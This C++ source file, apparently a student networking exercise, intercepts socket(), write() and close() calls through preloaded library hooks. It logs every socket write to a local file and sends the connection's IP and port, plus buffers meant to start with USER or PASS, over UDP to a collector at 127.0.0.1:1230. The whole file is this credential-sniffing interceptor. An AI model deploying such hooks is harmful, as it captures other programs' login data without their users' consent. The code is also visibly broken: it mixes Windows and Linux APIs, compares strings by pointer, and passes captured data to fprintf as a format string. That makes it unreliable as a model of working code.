#if !defined(_GNU_SOURCE)
#   define _GNU_SOURCE
#endif

//
// System calls interceptor for the networking spoiling...
//

extern "C"
{
#include <dlfcn.h>
#include "unistd.h"
}

#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <ws2tcpip.h>
#include <sstream>
#pragma comment (lib, "ws2_32.lib")


static void init (void) __attribute__ ((constructor));

typedef ssize_t (*write_t)(int fd, const void *buf, size_t count);
typedef int (*socket_t)(int domain, int type, int protocol);
typedef int (*close_t)(int fd);

static close_t old_close;
static socket_t old_socket;
static write_t old_write;

static int socket_fd = -1;
const int port = 1230;
int sock = 0;
FILE* file;
in_addr ip_to_num{};
sockaddr_in addr =
{
    addr.sin_family = PF_INET,
    addr.sin_port = htons(port),
};
socklen_t address_len = sizeof(sockaddr_in);

void init(void)
{
    srand(time(nullptr));
    printf("Interceptor library loaded.\n");

    old_close = reinterpret_cast<close_t>(dlsym(RTLD_NEXT, "close"));
    old_write = reinterpret_cast<write_t>(dlsym(RTLD_NEXT, "write"));
    old_socket = reinterpret_cast<socket_t>(dlsym(RTLD_NEXT, "socket"));
}
bool message(const char* char_buf)
{
    char str[4];
    for (int i = 0; i < 4; ++i)
    {
        str[i] = char_buf[i];
    }
    if (str =="USER" || str =="PASS")
    {
        return true;
    }
    return false;
}

extern "C"
{

int close(int fd)
{
    if (fd == socket_fd)
    {
        printf("> close() on the socket was called!\n");
        socket_fd = -1;

        std::string str = "> close() on the socket was called!\n";
        sendto(sock, str.c_str(), str.size(), 0, reinterpret_cast<const sockaddr*>(&addr),   // sent to the server
            address_len);
    }

    return old_close(fd);
}


ssize_t write(int fd, const void *buf, size_t count)
{
    auto char_buf = reinterpret_cast<const char*>(buf);

    if (char_buf && (count > 1) && (fd == socket_fd))
    {
        sockaddr_in ip_addr;
        int x = sizeof(ip_addr);
        getsockname(fd, (sockaddr*)&ip_addr, &x);                   // task 3
        char ip[INET_ADDRSTRLEN];                                   // get the ip used by the socket
        inet_ntop(AF_INET, &(ip_addr.sin_addr), ip, INET_ADDRSTRLEN);       //get the port used by the socket
        std::stringstream str;
        str << "ip: " << ip << "port: " << htons(ip_addr.sin_port) << '\n';
        if (message(char_buf))
        {
            str << char_buf << '\n';
        }
        sendto(sock, str.str().c_str(), str.str().size(), 0, reinterpret_cast<const sockaddr*>(&addr),   // sent to the server
            address_len);

        printf("> write() on the socket was called with a string!\n");
        printf("New buffer = [");

                                    
        file = fopen("file.txt", "a+");         // task 1
        fprintf(file, char_buf);                // writing to a file "C style"
        fclose(file);
        //for (size_t i = 0; i < count - 1; ++i)
        //{
        //    int r = rand();
        //    char *c = const_cast<char *>(char_buf) + i;

        //    // ASCII symbol.
        //    if (1 == r % count) *c = r % (0x7f - 0x20) + 0x20;

        //    putchar(*c);
        //}

        printf("]\n");
    }

    return old_write(fd, buf, count);
}


int socket(int domain, int type, int protocol)
{
    int cur_socket_fd = old_socket(domain, type, protocol);

    if (-1 == socket_fd)
    {
        sock = old_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);        // socket to server
        if (!sock)
        {
            printf("error code \d", WSAGetLastError());
            return EXIT_FAILURE;
        }
        int stat = inet_pton(AF_INET, "127.0.0.1", &ip_to_num);
        if (stat <= 0)
        {
            printf("error code \d", WSAGetLastError());
            return EXIT_FAILURE;
        }
        addr.sin_addr = ip_to_num;

        printf("> socket() was called, fd = %d!\n", cur_socket_fd);
        socket_fd = cur_socket_fd;
    }
    else
    {
        printf("> socket() was called, but socket was opened already...\n");
    }

    return cur_socket_fd;
}

} // extern "C"

